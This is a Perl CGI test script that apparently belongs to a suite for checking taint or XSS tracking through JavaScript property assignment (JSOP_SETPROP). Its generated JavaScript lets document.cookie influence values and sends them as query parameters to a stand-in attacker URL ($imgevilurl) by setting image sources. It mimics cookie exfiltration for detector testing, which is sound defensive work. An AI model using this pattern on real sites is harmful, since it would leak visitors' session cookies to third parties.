#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_SETPROP";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var evil = 2;
		if ($evil) {
			evil = 43;
		}
		var notevil = 42;
		var notevil2 = 42;
		var notevil3 = evil;

		var dut = { 'x' : 7 };
		var dut2 = { 'x' : 7 };
		var dut3 = { 'x' : 7 };

		// shouldn't be evil 

		dut.x = notevil;
		
		var url = "$imgevilurl?normal=" + dut.x;
		document.images[0].src = url;
		
		// if with evil val 
		
		if ($evil) {
			dut2.x = notevil2;
		}
	
		var url2 = "$imgevilurl?if=" + dut2.x;
		document.images[1].src = url2;
		
		// normal usage 	
		notevil3 = evil;
		dut3.x = notevil3;
		
		var url3 = "$imgevilurl?isevil=" + dut3.x;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
